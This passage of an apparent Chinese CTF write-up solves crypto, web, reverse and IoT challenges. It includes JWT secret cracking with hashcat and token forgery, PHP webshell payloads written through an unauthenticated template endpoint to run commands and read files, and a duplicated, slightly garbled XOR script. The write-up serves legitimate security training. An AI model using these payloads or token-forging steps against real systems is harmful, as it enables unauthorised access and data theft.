7753334190670676538446720585641859573433398743249700376484724298227907926849838085521963801408733235146240320346355009426906239872747392144736251780704977), (8299099631691361462893953510891571024438769990517881312043204121912273865770751850474084908124074498491364123876411607614783809672532677182810786551530236, 1850925269241030992691402475818420047494547060148283456210768271370265182087692429342859918730723443662381559466247461949717812910218990345175688951352463), (3153803035425954485388059217642503655668114692609711492446855252064443129547366536023055176005359522287016316267760750993074929407215122939099849400146684, 8212436592957141471533918899961881794532929265974532094198335625261970575879354714612726011218656880333087010971396164348888163103134249685035160466428893), (382776251972683162969137667785567984384290833592973844371610020937563323010839647792998943194116498772324465856791567205427662610024045091038814208263484, 676358016809511771333866886614256139498887961722630346274766646920140715993325241881077698730828177418833236078140586896144370558347572672150244705573519), (1691433422586309279816119068813544959916209612536303370492461656830904826416690221284704787208252738787389369317471538526983395018421865500920840681245663, 8403443691175628318411736415339597118989092964994031807359279687811927434675239227236567940010318597393775103350326829250819642598243721575412700792498900), (275806834075046641013656845029727938896135374487534330613029156229251702278764369369772064852312559831504835339696564904539551736015140639067445623431152, 6577150175375314081077722739090578027857810661765284783984639508642933027085377135918361786655916167922282799254162203359610957807591620427815841742171461), (5265903652703527428854672016212551093754479669961028121145288016160652115123235984477569118169510725255823273484188886656577477765631533875862655774967430, 5844658045975164560536702755522017021201699068948110473314041745782236538859637867917515787652073246575417282155529807235915240553861762687257791282155929), (10755958150627542439503991149243528352912807333945079169841313114537575617416916501230841947227017430365733523282575886141873994964186782784247910600422133, 5972264584103791666713406043123051515895497479181511683362693289465234484963177727868977634921335668191515839158160927877388276628500805325129382626589797), (2874899664578375983080728195667256942067344855479531687322864765538594373911892436945087043415841955863427589850322111827927636477081217711280709118874318, 6540406788521211835470251698063051662706898704267381715107551456767052583629832166003961937569833997328861496038345512332340380114045088129481899031991893), (10795521906690341353772601060644892051620578172176883594482772326651448283948314165229282203906464168702495741643062598036232174174127695291083810624554942, 6652625472869226167056761848338668216933432909457328262989386117179784558643677636006127533672984402759443631020780356519352673431773730684756836190699340), (7339235419213163414750352747610057623136858889814642133567062936815360603250260207647872023306809097694736247194874624893003076242957235361364339586853021, 5187782095170398198551458757942377008246293708992561530628060270139209180654493648130056902725573769819246400643646671985350867705852058069312175673985488), (1544129876235167854544782762775365882656702052172506506203380863898952829453926276823950429505877949412168631783546594771357821378503365392208987072003559, 7026458087980163221460582764199084613389639975772226907928090721491161856198484784481090429561216394513350683361380545854827390987196197393969946368336077), (4094944404044760466250567205213975777639108577925836641304058380946558879157675988189822587708635799268789931461760616526159151649612261301752329740376656, 7617445993346577313348341154852822159574750640978221029227889101432976720566638790653213605802846155613066288875992779638873350568769501902070806146693014), (1047171724289918884443388054089002620955976095601018978652974915706602837727859687503476839868655128412771307298616261093422446641323802691951730338375391, 8493097817612495005746562525578439841199022041487535790695823855541167774591234650229306314838514318082659056478241723539512908482058250795367549468045818), (6125277953182773690703210994168685482252039068786421523819650920598144427039838999734754427347812527212592563571649142129834001856311497237125332427371662, 8395574928161472064627370271176385006792228123838986698825194540578364280845737652181986634254146175463330719501615174747454931644314818285496715282911319)]</span><br><span class="line"></span><br><span class="line">n = len(pts)</span><br><span class="line"></span><br><span class="line">def recover_curve(points):</span><br><span class="line">    g = 0</span><br><span class="line">    for i in range(len(points) - 3):</span><br><span class="line">        (x1,y1),(x2,y2),(x3,y3),(x4,y4) = points[i:i+4]</span><br><span class="line"></span><br><span class="line">        t1 = y2^2 - y1^2 - x2^3 + x1^3</span><br><span class="line">        t2 = y3^2 - y2^2 - x3^3 + x2^3</span><br><span class="line">        t3 = y4^2 - y3^2 - x4^3 + x3^3</span><br><span class="line"></span><br><span class="line">        k1 = t1*(x3-x2) - t2*(x2-x1)</span><br><span class="line">        k2 = t2*(x4-x3) - t3*(x3-x2)</span><br><span class="line">        k3 = t1*(x4-x3) - t3*(x2-x1)</span><br><span class="line"></span><br><span class="line">        g = gcd(g, abs(int(k1)))</span><br><span class="line">        g = gcd(g, abs(int(k2)))</span><br><span class="line">        g = gcd(g, abs(int(k3)))</span><br><span class="line"></span><br><span class="line">    p = ZZ(g)</span><br><span class="line"></span><br><span class="line">    # 去掉小因子（这题通常会多一个 2）</span><br><span class="line">    for q in prime_range(2, 2000):</span><br><span class="line">        while p % q == 0:</span><br><span class="line">            cand = p // q</span><br><span class="line">            if all(px &lt; cand and py &lt; cand for px, py in points):</span><br><span class="line">                p = cand</span><br><span class="line">            else:</span><br><span class="line">                break</span><br><span class="line"></span><br><span class="line">    for i in range(len(points)):</span><br><span class="line">        for j in range(i + 1, len(points)):</span><br><span class="line">            x1, y1 = points[i]</span><br><span class="line">            x2, y2 = points[j]</span><br><span class="line">            if gcd(int(x2 - x1), int(p)) == 1:</span><br><span class="line">                f1 = (y1*y1 - x1*x1*x1) % p</span><br><span class="line">                f2 = (y2*y2 - x2*x2*x2) % p</span><br><span class="line">                a = ((f2 - f1) * inverse_mod(x2 - x1, p)) % p</span><br><span class="line">                b = (f1 - a*x1) % p</span><br><span class="line">                return p, a, b</span><br><span class="line"></span><br><span class="line">    raise ValueError(&quot;recover curve failed&quot;)</span><br><span class="line"></span><br><span class="line">def SmartAttack(P, Q, p):</span><br><span class="line">    E = P.curve()</span><br><span class="line"></span><br><span class="line">    Ep = EllipticCurve(</span><br><span class="line">        Qp(p, 2),</span><br><span class="line">        [ZZ(t) + ZZ.random_element(0, p) * p for t in E.a_invariants()]</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    # lift P</span><br><span class="line">    for cand in Ep.lift_x(ZZ(P.xy()[0]), all=True):</span><br><span class="line">        if GF(p)(cand.xy()[1]) == P.xy()[1]:</span><br><span class="line">            P_Qp = cand</span><br><span class="line">            break</span><br><span class="line">    else:</span><br><span class="line">        raise ValueError(&quot;lift P failed&quot;)</span><br><span class="line"></span><br><span class="line">    # lift Q</span><br><span class="line">    for cand in Ep.lift_x(ZZ(Q.xy()[0]), all=True):</span><br><span class="line">        if GF(p)(cand.xy()[1]) == Q.xy()[1]:</span><br><span class="line">            Q_Qp = cand</span><br><span class="line">            break</span><br><span class="line">    else:</span><br><span class="line">        raise ValueError(&quot;lift Q failed&quot;)</span><br><span class="line"></span><br><span class="line">    pP = p * P_Qp</span><br><span class="line">    pQ = p * Q_Qp</span><br><span class="line"></span><br><span class="line">    xP, yP = pP.xy()</span><br><span class="line">    xQ, yQ = pQ.xy()</span><br><span class="line"></span><br><span class="line">    phiP = -(xP / yP)</span><br><span class="line">    phiQ = -(xQ / yQ)</span><br><span class="line"></span><br><span class="line">    return ZZ(phiQ / phiP)</span><br><span class="line"></span><br><span class="line">def vec_to_flag(v):</span><br><span class="line">    return bytes([int(t) &amp; 0xff for t in v])</span><br><span class="line"></span><br><span class="line">print(&quot;[+] recovering curve ...&quot;)</span><br><span class="line">p, a, b = recover_curve(pts)</span><br><span class="line">print(&quot;[+] p =&quot;, p)</span><br><span class="line">print(&quot;[+] a =&quot;, a)</span><br><span class="line">print(&quot;[+] b =&quot;, b)</span><br><span class="line"></span><br><span class="line">E = EllipticCurve(GF(p), [a, b])</span><br><span class="line"></span><br><span class="line">for i, (xx, yy) in enumerate(pts):</span><br><span class="line">    _ = E(xx, yy)</span><br><span class="line">print(&quot;[+] all points are on the curve&quot;)</span><br><span class="line"></span><br><span class="line">ordE = E.order()</span><br><span class="line">print(&quot;[+] #E(F_p) =&quot;, ordE)</span><br><span class="line">assert ordE == p, &quot;this solver expects an anomalous curve&quot;</span><br><span class="line"></span><br><span class="line">G = E.gens()[0]</span><br><span class="line">print(&quot;[+] generator =&quot;, G)</span><br><span class="line"></span><br><span class="line">print(&quot;[+] running Smart attack on all points ...&quot;)</span><br><span class="line">d = []</span><br><span class="line">for i, pt in enumerate(pts):</span><br><span class="line">    di = SmartAttack(G, E(pt), p) % p</span><br><span class="line">    d.append(ZZ(di))</span><br><span class="line">    print(f&quot;    done &#123;i+1&#125;/&#123;n&#125;&quot;)</span><br><span class="line"></span><br><span class="line">print(&quot;[+] building lattice ...&quot;)</span><br><span class="line">K = 2^100</span><br><span class="line">L = Matrix(ZZ, n + 1, n + 1)</span><br><span class="line">for i in range(n):</span><br><span class="line">    L[i, i] = 1</span><br><span class="line">    L[i, n] = d[i] * K</span><br><span class="line">L[n, n] = p * K</span><br><span class="line"></span><br><span class="line">B = L.LLL()</span><br><span class="line"></span><br><span class="line"># 原关系有 3 列，所以取 n-3 行构造正交约束</span><br><span class="line">rows = n - 3</span><br><span class="line">R = Matrix(ZZ, rows, n)</span><br><span class="line">for i in range(rows):</span><br><span class="line">    R[i] = B[i][:n]</span><br><span class="line"></span><br><span class="line">print(&quot;[+] kernel basis ...&quot;)</span><br><span class="line">KB = Matrix(ZZ, R.right_kernel().basis())</span><br><span class="line">KB = KB.LLL()</span><br><span class="line"></span><br><span class="line">print(&quot;[+] candidates:&quot;)</span><br><span class="line">for i, v in enumerate(KB):</span><br><span class="line">    c1 = vec_to_flag(v)</span><br><span class="line">    c2 = vec_to_flag(-v)</span><br><span class="line">    print(f&quot;[&#123;i&#125;] &#123;c1&#125;&quot;)</span><br><span class="line">    print(f&quot;[&#123;i&#125;] &#123;c2&#125;&quot;)</span><br><span class="line">    if b&quot;flag&#123;&quot; in c1:</span><br><span class="line">        print(&quot;\n[FOUND]&quot;, c1)</span><br><span class="line">    if b&quot;flag&#123;&quot; in c2:</span><br><span class="line">        print(&quot;\n[FOUND]&quot;, c2)</span><br></pre></td></tr></table></figure>
+
+<p>最后得到flag:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;893d041e-c0a2-3145-5320-cdee7d3c87fb&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Signed-Too-Weak"><a href="#Signed-Too-Weak" class="headerlink" title="Signed_Too_Weak"></a>Signed_Too_Weak</h3><p>本题思路如下：</p>
+<p><img src="https://raw.githubusercontent.com/simple9656/phpto/main/images/wps46-1775523446230-80.jpg" alt="img"> </p>
+<p>先把他的默认账号和密码输进去看看:</p>
+<p>虽然前端是这样：</p>
+<p><img src="https://raw.githubusercontent.com/simple9656/phpto/main/images/wps47-1775523446230-79.jpg" alt="img"> </p>
+<p>但是你可以发现url上多了一坨key:</p>
+<p><a target="_blank" rel="noopener" href="http://f634eb36-7365-4455-9945-4bb6e7878372.www.polarctf.com:8090/index.php?key=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJpYXQiOjE3NzQxMDAwOTIsImV4cCI6MTc3NDEwMzY5Mn0.FnZRabu2Zoyf9UpHgfiB3y5AOyQCX5IzaZjVmUZTETU">http://f634eb36-7365-4455-9945-4bb6e7878372.www.polarctf.com:8090/index.php?key=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJpYXQiOjE3NzQxMDAwOTIsImV4cCI6MTc3NDEwMzY5Mn0.FnZRabu2Zoyf9UpHgfiB3y5AOyQCX5IzaZjVmUZTETU</a></p>
+<p>这key就是jwt,那就伪造jwt:<a target="_blank" rel="noopener" href="https://www.bejson.com/jwt/">https://www.bejson.com/jwt/</a></p>
+<p>先用hashcat把对称密钥爆出来：</p>
+<p>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJpYXQiOjE3NzQxMDAwOTIsImV4cCI6MTc3NDEwMzY5Mn0.FnZRabu2Zoyf9UpHgfiB3y5AOyQCX5IzaZjVmUZTETU保存到hash.txt里，然后使用命令:</p>
+<p>hashcat -m 16500 hash.txt rockyou.txt</p>
+<p><img src="https://raw.githubusercontent.com/simple9656/phpto/main/images/wps48-1775523446229-76.jpg" alt="img"> </p>
+<p>爆出来密钥是polar</p>
+<p><img src="https://raw.githubusercontent.com/simple9656/phpto/main/images/wps49-1775523446230-78.jpg" alt="img"> </p>
+<p>把username后面的值改成admin然后编码校验即可，最后把修改的jwt粘贴进url里即可得到flag。</p>
+<p><img src="https://raw.githubusercontent.com/simple9656/phpto/main/images/wps50-1775523446229-77.jpg" alt="img"> </p>
+<p>flag:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;1ef71ce34edda6640854cd8d4638af3a45b011eaf21fc8ee71eca8ad24ce1cdd&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="coke的粉丝团"><a href="#coke的粉丝团" class="headerlink" title="coke的粉丝团"></a>coke的粉丝团</h3><p>本题思路如下：</p>
+<p><img src="https://raw.githubusercontent.com/simple9656/phpto/main/images/wps51-1775523523395-86.jpg" alt="img"> </p>
+<p>先自己注册一个账号登录进去</p>
+<p><img src="https://raw.githubusercontent.com/simple9656/phpto/main/images/wps52-1775523523396-87.jpg" alt="img"> </p>
+<p>在52页能找到：</p>
+<p><img src="https://raw.githubusercontent.com/simple9656/phpto/main/images/wps53-1775523523396-89.jpg" alt="img"> </p>
+<p>发现点不了那个按钮，那就改前端吧：</p>
+<p><img src="https://raw.githubusercontent.com/simple9656/phpto/main/images/wps54-1775523523396-90.jpg" alt="img"> </p>
+<p>右键-&gt;检查：</p>
+<p><img src="https://raw.githubusercontent.com/simple9656/phpto/main/images/wps55-1775523523396-88.jpg" alt="img"> </p>
+<p>发现写了个disabled，删掉就可以点了：</p>
+<p><img src="https://raw.githubusercontent.com/simple9656/phpto/main/images/wps56-1775523523396-91.jpg" alt="img"> </p>
+<p>点击发现：</p>
+<p><img src="https://raw.githubusercontent.com/simple9656/phpto/main/images/wps57-1775523523396-93.jpg" alt="img"> </p>
+<p>我在抓包的时候发现抓到了jwt,说明这题还是jwt伪造：</p>
+<p><img src="https://raw.githubusercontent.com/simple9656/phpto/main/images/wps58-1775523523396-94.jpg" alt="img"> </p>
+<p>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Impva2UifQ.0oTp5_Aq1YCMlYNmQOYj7HgyQbQjArO-s0wwG0Xx-rg存进hash.txt,使用hashcat破解：</p>
+<p>hashcat -m 16500 hash.txt rockyou.txt</p>
+<p><img src="https://raw.githubusercontent.com/simple9656/phpto/main/images/wps59-1775523523396-95.jpg" alt="img"> </p>
+<p>这里我之前跑过了,密钥是coke</p>
+<p><img src="https://raw.githubusercontent.com/simple9656/phpto/main/images/wps60-1775523523396-92.jpg" alt="img"> </p>
+<p>cookie里把jwt改一下就可以拿到flag:</p>
+<p><img src="https://raw.githubusercontent.com/simple9656/phpto/main/images/image-20260407085900131.png" alt="image-20260407085900131"></p>
+<h3 id="新年贺卡"><a href="#新年贺卡" class="headerlink" title="新年贺卡"></a>新年贺卡</h3><p>本题思路如下：</p>
+<p>本题是一个基于 PHP 开发的“新年贺卡生成器”。通过提供前端页面和后端源码，我们可以进行白盒审计。</p>
+<p>核心漏洞：未授权访问 + 任意文件写入导致 RCE</p>
+<p>在审计源码时发现，路由 ?action&#x3D;admin 没有任何的权限验证（如 Session 或 Token 检查）。攻击者可以直接通过传入 debug&#x3D;add_template 参数访问后台的模板添加功能。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// 漏洞代码片段</span><br><span class="line">else if ($debug === &#x27;add_template&#x27; &amp;&amp; $_SERVER[&#x27;REQUEST_METHOD&#x27;] === &#x27;POST&#x27;) &#123;</span><br><span class="line">    $name = $_POST[&#x27;template_name&#x27;] ?? &#x27;&#x27;;</span><br><span class="line">    $content = $_POST[&#x27;template_content&#x27;] ?? &#x27;&#x27;;</span><br><span class="line">    try &#123;</span><br><span class="line">        // 未经任何过滤，直接将传入的 name 和 content 写入 .php 文件</span><br><span class="line">        TemplateManager::addTemplate($name, $content);</span><br></pre></td></tr></table></figure>
+
+<p>1.发现隐藏接口与尝试写入 Webshell<br>源码中包含一个隐藏的表单路径 ?action&#x3D;admin&amp;debug&#x3D;&#x2F;** **&#x2F;_form，但由于特殊字符可能被 WAF 拦截或路由解析失败，我们选择直接向后端接口发送 POST 请求来盲打。<br>使用 HackBar 或 Burp Suite 构造 POST 请求，尝试写入基础的系统命令执行木马：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">URL:?action=admin&amp;debug=add_template</span><br><span class="line">POSTData:template_name=hack&amp;template_content=&lt;?php system(&#x27;cat /flag&#x27;); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>2.绕过命令执行限制 (Disable Functions)<br>写入 hack.php 后，在主页生成贺卡触发执行，但下载返回的“图片”文件（实际上是被劫持输出的文本文件）为空。这说明目标服务器可能在 php.ini 中禁用了 system() 等命令执行函数，或者 Flag 不在 &#x2F;flag 路径下。<br>为此，我们改用 PHP 原生函数 scandir() 进行目录遍历探路。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POSTData:template_name=hack2&amp;template_content=&lt;?php print_r(scandir(&#x27;/&#x27;)); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>触发 hack2 模板后，下载贺卡并用记事本打开，成功获取根目录结构，发现目标文件为 flag.txt：</p>
+<p><img src="https://raw.githubusercontent.com/simple9656/phpto/main/images/image-20260407090214125.png" alt="image-20260407090214125"></p>
+<p>3:读取 flag</p>
+<p>确立目标文件后，再次利用 PHP 原生函数 file_get_contents() 读取文件内容。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST Data: template_name=hack3&amp;template_content=&lt;?php echo file_get_contents(&#x27;/flag.txt&#x27;); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>回到主页</p>
+<p>选择模板 hack3。</p>
+<p>随意输入祝福语，点击“生成贺卡”。</p>
+<p>此时页面会显示一张损坏的图片</p>
+<p><img src="https://raw.githubusercontent.com/simple9656/phpto/main/images/wps61-1775523775460-106.jpg" alt="img"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;09328acfbc035a4e69a710f71eab8a5c&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="练习2"><a href="#练习2" class="headerlink" title="练习2"></a>练习2</h3><p>本题思路如下：</p>
+<p>先把文件拖入查壳工具：</p>
+<p><img src="https://raw.githubusercontent.com/simple9656/phpto/main/images/wps62-1775523978074-108.jpg" alt="img"> </p>
+<p>用upx脱壳：</p>
+<p><img src="https://raw.githubusercontent.com/simple9656/phpto/main/images/wps63-1775523978075-110.jpg" alt="img"> </p>
+<p>下面用IDA Pro进行分析先找到主函数：</p>
+<p><img src="https://raw.githubusercontent.com/simple9656/phpto/main/images/wps64-1775523978075-109.jpg" alt="img"> </p>
+<p>分析一下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if ( isalpha(v6) )</span><br><span class="line">&#123;</span><br><span class="line">  v9 = islower(v8);</span><br><span class="line">  v10 = 65;</span><br><span class="line">  if ( v9 )</span><br><span class="line">    v10 = 97;</span><br><span class="line">  *v7 = v10 + (v8 - v10 + 7) % 26;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>程序首先遍历输入字符串，使用 isalpha 判断字符是否为字母。如果是字母，则保留其大小写状态（通过 islower 区分基准值是 65(‘A’) 还是 97(‘a’)），然后将其在字母表上向后移动 7 位。非字母字符保持原样不变。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if ( v13 &lt; (__int64)(int)v12 )</span><br><span class="line">&#123;</span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    *((_BYTE *)v24 + v19) = *((_BYTE *)v23 + v19) ^ 0x50;</span><br><span class="line">    ++v19;</span><br><span class="line">  &#125;</span><br><span class="line">  while ( v19 &lt; (int)v12 );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>经过凯撒加密后的字符串，接着经历了一次异或加密。虽然代码中存在大量 SIMD 指令（编译器为了加速 16 字节块处理生成的优化代码），但通过下方处理剩余不足 64 字节数据的逻辑可以看出，本质上是对每一个字节进行了 ^ 0x50（异或 0x50）的操作。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">v21 = 0;</span><br><span class="line">do</span><br><span class="line">&#123;</span><br><span class="line">  sub_140001070(&amp;v26[v21], &quot;%02x&quot;);</span><br><span class="line">  v21 += 2;</span><br><span class="line">  ++v5;</span><br><span class="line">&#125;</span><br><span class="line">while ( v5 &lt; v20 );</span><br></pre></td></tr></table></figure>
+
+<p>最后，程序将异或后的字节流格式化为了小写的十六进制字符串（%02x）。</p>
+<p>hint.txt:3d23383e2b2a233837243a213b323c202a2628213a253735232a3b22212d</p>
+<p>通过这个编写exp:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">def solve():</span><br><span class="line">    cipher_hex = &quot;3d23383e2b2a233837243a213b323c202a2628213a253735232a3b22212d&quot;</span><br><span class="line">    </span><br><span class="line">    # 1. Hex 解码</span><br><span class="line">    encrypted_bytes = bytes.fromhex(cipher_hex)</span><br><span class="line">    </span><br><span class="line">    # 2. 异或解密 (XOR 0x50)</span><br><span class="line">    xor_decrypted = [b ^ 0x50 for b in encrypted_bytes]</span><br><span class="line">    </span><br><span class="line">    # 3. 反向凯撒解密 (向左偏移 7 位)</span><br><span class="line">    flag = &quot;&quot;</span><br><span class="line">    for b in xor_decrypted:</span><br><span class="line">        char = chr(b)</span><br><span class="line">        if char.isalpha():</span><br><span class="line">            base = ord(&#x27;a&#x27;) if char.islower() else ord(&#x27;A&#x27;)</span><br><span class="line">            # 减去偏移量 7，加上 26 取模防止负数，再加回基准 ascii 码</span><br><span class="line">            original_char = chr((b - base - 7 + 26) % 26 + base)</span><br><span class="line">            flag += original_char</span><br><span class="line">        else:</span><br><span class="line">            flag += char</span><br><span class="line">            </span><br><span class="line">    print(&quot;[+] 破解成功!&quot;)</span><br><span class="line">    print(f&quot;[+] Flag: &#123;flag&#125;&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    solve()</span><br></pre></td></tr></table></figure>
+
+<p>flag:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;slazmcjdueisoqjcnzxlsdkj&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="PloTS"><a href="#PloTS" class="headerlink" title="PloTS"></a>PloTS</h2><h3 id="bllhl-xmpp"><a href="#bllhl-xmpp" class="headerlink" title="bllhl_xmpp"></a>bllhl_xmpp</h3><p>本题思路如下：</p>
+<p>依旧grep大法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">strings -el 2.bin | grep -i &quot;flag&#123;&quot;</span><br><span class="line">strings -el 2.bin | grep -i &quot;flag&#123;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>都能直接获得flag:</p>
+<p><img src="https://raw.githubusercontent.com/simple9656/phpto/main/images/wps65-1775524198716-114.jpg" alt="img"> </p>
+<p>  flag:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;polarctf_iot_oo&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="polarble"><a href="#polarble" class="headerlink" title="polarble"></a>polarble</h3><p>本题思路如下：</p>
+<p>给了一个bin说是让我烧录，但是我对硬件不熟，就用grep大法了：</p>
+<p><img src="https://raw.githubusercontent.com/simple9656/phpto/main/images/wps66-1775524252065-116.jpg" alt="img"> </p>
+<p>看看这个I have al…这句话上下有什么信息：</p>
+<p><img src="https://raw.githubusercontent.com/simple9656/phpto/main/images/wps67-1775524252066-117.jpg" alt="img"> </p>
+<p>这个告诉我们flag被xor了，密文就在下面那一串</p>
+<p>@&lt;6;&#x3D;!2;3 343-&#x2F;&gt;36?’&#x3D;3,?7?&lt;6;&#x3D;</p>
+<p>那咱们就编写脚本爆破xor呗：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">ciphertext = &quot;@&lt;6;=!2;3 343-/&gt;36?&#x27;=3,?7?&lt;6;=&quot;</span><br><span class="line">print(&quot;开始爆破 XOR 密钥...&quot;)</span><br><span class="line">for key in range(256):</span><br><span class="line">    try:</span><br><span class="line">        # 遍历对每一个字符进行异或操作</span><br><span class="line">        plaintext = &quot;&quot;.join([chr(ord(c) ^ key) for c in ciphertext])</span><br><span class="line">        </span><br><span class="line">        # 查找常见的 Flag 格式特征</span><br><span class="line">        if &quot;flag&quot; in plaintext.lower() or &quot;&#123;&quot; in plaintext:</span><br><span class="line">            print(f&quot;[*] 可能是 Flag 的 Key: 0x&#123;key:02x&#125; (&#123;key&#125;) -&gt; &#123;plaintext&#125;&quot;)</span><br><span class="line">            </span><br><span class="line">    except Exception:</span><br><span class="line">        Passciphertext = &quot;@&lt;6;=!2;3 343-/&gt;36?&#x27;=3,?7?&lt;6;=&quot;</span><br><span class="line">print(&quot;开始爆破 XOR 密钥...&quot;)</span><br><span class="line">for key in range(256):</span><br><span class="line">    try:</span><br><span class="line">        # 遍历对每一个字符进行异或操作</span><br><span class="line">        plaintext = &quot;&quot;.join([chr(ord(c) ^ key) for c in ciphertext])</span><br><span class="line">        </span><br><span class="line">        # 查找常见的 Flag 格式特征</span><br><span class="line">        if &quot;flag&quot; in plaintext.lower() or &quot;&#123;&quot; in plaintext:</span><br><span class="line">            print(f&quot;[*] 可能是 Flag 的 Key: 0x&#123;key:02x&#125; (&#123;key&#125;) -&gt; &#123;plaintext&#125;&quot;)</span><br><span class="line">            </span><br><span class="line">    except Exception:</span><br><span class="line">        Pass</span><br></pre></td></tr></table></figure>
+
+<p>发现flag:</p>
+<p><img src="https://raw.githubusercontent.com/simple9656/phpto/main/images/wps68-1775524277018-120.jpg" alt="img"> </p>
+<p>flag为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;haiziniwudile&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="实习生flashrom"><a href="#实习生flashrom" class="headerlink" title="实习生flashrom"></a>实习生flashrom</h3><p>本题思路如下：</p>
+<ol>
+<li>分析实习生日志与芯片状态：</li>
+</ol>
+<p>  从 intern_log.txt 可以看出，主板的 Winbond W25Q128JV 芯片的状态寄存器（SR1:0x18）表明块保护（Block Protect）位被设置，导致 0x1F00000 之后的关键区域变成了只读&#x2F;不可读保护模式，读出来全是 FF。</p>
+<ol start="2">
+<li>分析解锁工具 (unlocker.py)：</li>
+</ol>
+<p>  这个 Python 脚本实际上是一个用来修复并“解锁”被保护固件的工具。它要求输入一个密码来验证权限。如果密码验证通过（通过比对 _ENC 的哈希和解密），它会将丢失的“主密钥加载区”（Master Key Loader Area）数据重新注入到固件的 0x1F00000 偏移处。</p>
+<p>3.直接提取“主密钥”明文：</p>
+<p>  虽然 unlocker.py 里面用来验证工具执行权限的密码被混淆加密了，但工具准备注入到固件中的最终开锁密钥数据却是明文硬编码在代码里的。</p>
+<p>  查看脚本中的 <code>_make_blob()</code> 函数，它模拟生成了一个 SquashFS 文件系统块：</p>
